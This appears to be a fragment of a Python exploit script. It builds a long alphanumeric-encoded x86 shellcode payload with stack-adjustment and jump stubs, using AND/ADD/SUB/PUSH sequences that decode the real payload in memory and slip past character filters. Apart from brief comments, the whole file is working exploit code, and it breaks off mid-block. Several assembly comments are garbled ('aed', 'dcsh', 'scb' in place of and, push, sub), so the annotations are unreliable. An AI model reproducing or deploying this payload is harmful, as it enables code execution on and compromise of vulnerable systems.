espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'

longJump = "\x54\x5b"
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
longJump += "\x50"

espAdj3 = '\x54\x58\x2c\x4b\x50\x5c'

shellcode = ""
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x36\x51\x50\x50" ## add  eax, 0x50505136
shellcode += "\x05\x36\x51\x40\x40" ## add  eax, 0x40405136
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x26\x33\x06\x26" ## add  eax, 0x26063326
shellcode += "\x05\x26\x34\x05\x25" ## add  eax, 0x25053426
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x72\x41\x76\x73" ## add  eax, 0x73764172
shellcode += "\x05\x61\x41\x75\x64" ## add  eax, 0x64754161
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x43\x13\x73\x53" ## add  eax, 0x53731343
shellcode += "\x05\x43\x12\x63\x43" ## add  eax, 0x43631243
shellcode += "\x05\x43\x12\x53\x42" ## add  eax, 0x42531243
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x30\x12\x32\x50" ## add  eax, 0x50321230
shellcode += "\x05\x30\x02\x41\x50" ## add  eax, 0x50410230
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x33\x44\x41\x67" ## add  eax, 0x67414433
shellcode += "\x05\x32\x43\x32\x66" ## add  eax, 0x66324332
shellcode += "\x05\x22\x43\x31\x45" ## add  eax, 0x45314322
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x04\x32\x55\x56" ## add  eax, 0x56553204
shellcode += "\x05\x04\x32\x45\x45" ## add  eax, 0x45453204
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x41\x64\x67\x44" ## add  eax, 0x44676441
shellcode += "\x05\x41\x54\x56\x44" ## add  eax, 0x44565441
shellcode += "\x05\x31\x34\x45\x44" ## add  eax, 0x44453431
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x37\x72\x36\x54" ## add  eax, 0x54367237
shellcode += "\x05\x36\x61\x26\x44" ## add  eax, 0x44266136
shellcode += "\x05\x35\x52\x24\x43" ## add  eax, 0x43245235
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x67\x16\x43\x66" ## add  eax, 0x66431667
shellcode += "\x05\x56\x15\x43\x55" ## add  eax, 0x55431556
shellcode += "\x05\x45\x14\x43\x63" ## add  eax, 0x63431445
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x14\x74\x66\x73" ## add  eax, 0x73667414
shellcode += "\x05\x13\x64\x56\x63" ## add  eax, 0x63566413
shellcode += "\x05\x13\x53\x64\x52" ## add  eax, 0x52645313
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x57\x67\x71\x24" ## add  eax, 0x24716757
shellcode += "\x05\x57\x56\x61\x14" ## add  eax, 0x14615657
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x31\x66\x15\x45" ## add  eax, 0x45156631
shellcode += "\x05\x31\x65\x15\x44" ## add  eax, 0x44156531
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x04\x64\x16\x42" ## add  eax, 0x42166404
shellcode += "\x05\x04\x64\x16\x42" ## add  eax, 0x42166404
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x32\x16\x64\x71" ## add  eax, 0x71641632
shellcode += "\x05\x32\x25\x54\x61" ## add  eax, 0x61542532
shellcode += "\x05\x22\x16\x33\x51" ## add  eax, 0x51331622
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x74\x57\x66\x23" ## add  eax, 0x23665774
shellcode += "\x05\x64\x46\x55\x13" ## add  eax, 0x13554664
shellcode += "\x05\x54\x45\x46\x23" ## add  eax, 0x23464554
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x56\x71\x11\x31" ## add  eax, 0x31117156
shellcode += "\x05\x45\x62\x21\x21" ## add  eax, 0x21216245
shellcode += "\x05\x46\x51\x11\x21" ## add  eax, 0x21115146
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x17\x63\x12\x46" ## add  eax, 0x46126317
shellcode += "\x05\x16\x52\x12\x46" ## add  eax, 0x46125216
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x11\x41\x22\x21" ## add  eax, 0x21224111
shellcode += "\x05\x22\x42\x21\x21" ## add  eax, 0x21214222
shellcode += "\x05\x11\x41\x22\x21" ## add  eax, 0x21224111
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x51\x17\x56\x66" ## add  eax, 0x66561751
shellcode += "\x05\x41\x16\x45\x55" ## add  eax, 0x55451641
shellcode += "\x05\x41\x15\x43\x34" ## add  eax, 0x34431541
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x23\x23\x67\x33" ## add  eax, 0x33672323
shellcode += "\x05\x22\x12\x56\x33" ## add  eax, 0x33561222
shellcode += "\x05\x22\x22\x65\x33" ## add  eax, 0x33652222
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x07\x45\x65\x55" ## add  eax, 0x55654507
shellcode += "\x05\x06\x45\x64\x45" ## add  eax, 0x45644506
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x66\x32\x16\x33" ## add  eax, 0x33163266
shellcode += "\x05\x55\x41\x05\x33" ## add  eax, 0x33054155
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x43\x76\x26\x11" ## add  eax, 0x11267643
shellcode += "\x05\x43\x65\x26\x10" ## add  eax, 0x10266543
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x12\x26\x46\x13" ## add  eax, 0x13462612
shellcode += "\x05\x02\x16\x46\x14" ## add  eax, 0x14461602
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x06\x43\x70\x64" ## add  eax, 0x64704306
shellcode += "\x05\x05\x43\x70\x54" ## add  eax, 0x54704305
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x76\x66\x65\x66" ## add  eax, 0x66656676
shellcode += "\x05\x65\x55\x54\x56" ## add  eax, 0x56545565
shellcode += "\x05\x53\x43\x34\x64" ## add  eax, 0x64344353
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x05\x67\x54\x34" ## add  eax, 0x34546705
shellcode += "\x05\x05\x57\x54\x44" ## add  eax, 0x44545705
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x40\x05\x33\x63" ## add  eax, 0x63330540
shellcode += "\x05\x40\x04\x24\x52" ## add  eax, 0x52240440
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x36\x52\x15\x33" ## add  eax, 0x33155236
shellcode += "\x05\x46\x41\x15\x42" ## add  eax, 0x42154146
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x63\x63\x30\x62" ## add  eax, 0x62306363
shellcode += "\x05\x62\x53\x20\x62" ## add  eax, 0x62205362
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x51\x77\x63\x16" ## add  eax, 0x16637751
shellcode += "\x05\x50\x67\x64\x15" ## add  eax, 0x15646750
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x75\x33\x11\x21" ## add  eax, 0x21113375
shellcode += "\x05\x64\x23\x10\x20" ## add  eax, 0x20102364
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x21\x02\x11\x66" ## add  eax, 0x66110221
shellcode += "\x05\x10\x01\x10\x56" ## add  eax, 0x56100110
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x67\x16\x17\x31" ## add  eax, 0x31171667
shellcode += "\x05\x67\x15\x07\x31" ## add  eax, 0x31071567
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x53\x40\x72\x71" ## add  eax, 0x71724053
shellcode += "\x05\x52\x40\x71\x70" ## add  eax, 0x70714052
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x35\x50\x74\x16" ## add  eax, 0x16745035
shellcode += "\x05\x44\x40\x64\x15" ## add  eax, 0x15644044
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x44\x74\x62\x52" ## add  eax, 0x52627444
shellcode += "\x05\x44\x63\x51\x42" ## add  eax, 0x42516344
shellcode += "\x05\x34\x53\x32\x42" ## add  eax, 0x42325334
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x73\x23\x61\x62" ## add  eax, 0x62612373
shellcode += "\x05\x63\x14\x61\x61" ## add  eax, 0x61611463
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x02\x50\x51\x36" ## add  eax, 0x36515002
shellcode += "\x05\x01\x40\x41\x35" ## add  eax, 0x35414001
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x45\x76\x32\x32" ## add  eax, 0x32327645
shellcode += "\x05\x34\x65\x21\x21" ## add  eax, 0x21216534
shellcode += "\x05\x34\x53\x22\x22" ## add  eax, 0x22225334
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x17\x56\x14\x32" ## add  eax, 0x32145617
shellcode += "\x05\x17\x55\x14\x31" ## add  eax, 0x31145517
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x47\x25\x71\x52" ## add  eax, 0x52712547
shellcode += "\x05\x46\x25\x70\x52" ## add  eax, 0x52702546
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x53\x77\x37\x35" ## add  eax, 0x35377753
shellcode += "\x05\x43\x76\x36\x24" ## add  eax, 0x24367643
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x77\x12\x35\x13" ## add  eax, 0x13351277
shellcode += "\x05\x66\x11\x35\x03" ## add  eax, 0x03351166
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x42\x44\x76\x13" ## add  eax, 0x13764442
shellcode += "\x05\x31\x33\x65\x23" ## add  eax, 0x23653331
shellcode += "\x05\x32\x33\x54\x12" ## add  eax, 0x12543332
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x63\x77\x47\x24" ## add  eax, 0x24477763
shellcode += "\x05\x63\x66\x46\x13" ## add  eax, 0x13466663
shellcode += "\x05\x42\x55\x35\x23" ## add  eax, 0x23355542
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x11\x62\x37\x64" ## add  eax, 0x64376211
shellcode += "\x05\x21\x51\x36\x63" ## add  eax, 0x63365121
shellcode += "\x05\x11\x32\x35\x43" ## add  eax, 0x43353211
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x62\x67\x26\x66" ## add  eax, 0x66266762
shellcode += "\x05\x52\x56\x15\x55" ## add  eax, 0x55155652
shellcode += "\x05\x42\x35\x24\x36" ## add  eax, 0x36243542
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x16\x15\x13\x12" ## add  eax, 0x12131516
shellcode += "\x05\x05\x04\x14\x01" ## add  eax, 0x01140405
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x62\x73\x23\x54" ## add  eax, 0x54237362
shellcode += "\x05\x52\x72\x14\x54" ## add  eax, 0x54147252
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x67\x33\x36\x66" ## add  eax, 0x66363367
shellcode += "\x05\x56\x22\x35\x55" ## add  eax, 0x55352256
shellcode += "\x05\x65\x22\x36\x44" ## add  eax, 0x44362265
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x56\x37\x55\x42" ## add  eax, 0x42553756
shellcode += "\x05\x55\x27\x55\x42" ## add  eax, 0x42552755
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x17\x37\x33\x16" ## add  eax, 0x16333717
shellcode += "\x05\x26\x36\x32\x15" ## add  eax, 0x15323626
shellcode += "\x05\x15\x25\x32\x14" ## add  eax, 0x14322515
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x44\x46\x67\x71" ## add  eax, 0x71674644
shellcode += "\x05\x44\x45\x56\x61" ## add  eax, 0x61564544
shellcode += "\x05\x43\x33\x45\x51" ## add  eax, 0x51453343
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x62\x76\x44\x66" ## add  eax, 0x66447662
shellcode += "\x05\x62\x65\x43\x55" ## add  eax, 0x55436562
shellcode += "\x05\x42\x54\x33\x64" ## add  eax, 0x64335442
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x76\x14\x66\x67" ## add  eax, 0x67661476
shellcode += "\x05\x65\x24\x55\x66" ## add  eax, 0x66552465
shellcode += "\x05\x56\x14\x44\x45" ## add  eax, 0x45441456
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x33\x65\x70\x77" ## add  eax, 0x77706533
shellcode += "\x05\x42\x54\x70\x67" ## add  eax, 0x67705442
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x54\x26\x72\x43" ## add  eax, 0x43722654
shellcode += "\x05\x44\x15\x61\x33" ## add  eax, 0x33611544
shellcode += "\x05\x44\x23\x52\x32" ## add  eax, 0x32522344
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x12\x14\x13\x03" ## add  eax, 0x03131412
shellcode += "\x05\x01\x14\x12\x04" ## add  eax, 0x04121401
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x64\x36\x66\x73" ## add  eax, 0x73663664
shellcode += "\x05\x54\x36\x55\x62" ## add  eax, 0x62553654
shellcode += "\x05\x63\x24\x43\x52" ## add  eax, 0x52432463
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x15\x02\x45\x22" ## add  eax, 0x22450215
shellcode += "\x05\x04\x01\x45\x11" ## add  eax, 0x11450104
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x61\x57\x52\x76" ## add  eax, 0x76525761
shellcode += "\x05\x61\x46\x42\x65" ## add  eax, 0x65424661
shellcode += "\x05\x41\x45\x42\x53" ## add  eax, 0x53424541
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x15\x16\x31\x51" ## add  eax, 0x51311615
shellcode += "\x05\x05\x16\x30\x50" ## add  eax, 0x50301605
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x17\x32\x65\x31" ## add  eax, 0x31653217
shellcode += "\x05\x26\x31\x54\x32" ## add  eax, 0x32543126
shellcode += "\x05\x15\x22\x44\x21" ## add  eax, 0x21442215
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x31\x76\x70\x06" ## add  eax, 0x06707631
shellcode += "\x05\x31\x65\x60\x06" ## add  eax, 0x06606531
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x26\x76\x61\x67" ## add  eax, 0x67617626
shellcode += "\x05\x25\x65\x62\x66" ## add  eax, 0x66626525
shellcode += "\x05\x23\x53\x41\x45" ## add  eax, 0x45415323
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x25\x65\x37\x22" ## add  eax, 0x22376525
shellcode += "\x05\x14\x65\x47\x21" ## add  eax, 0x21476514
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x43\x34\x44\x72" ## add  eax, 0x72443443
shellcode += "\x05\x42\x24\x44\x62" ## add  eax, 0x62442442
shellcode += "\x05\x42\x24\x44\x52" ## add  eax, 0x52442442
shellcode += "\x2D\x33\x33\x33\x33" ## scb  eax, 0x33333333
shellcode += "\x50"                 ## dcsh eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## aed  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## aed  eax, 0x2a313235
shellcode += "\x05\x64\x41\x12\x67" ## add  eax, 0x67124164
shellcode += "\x05\x64\x32\x21\x56" ## add  eax, 0x56213264
shellcode += "\x05\x44\x31\x12\x35" ## add  eax, 0x35123144
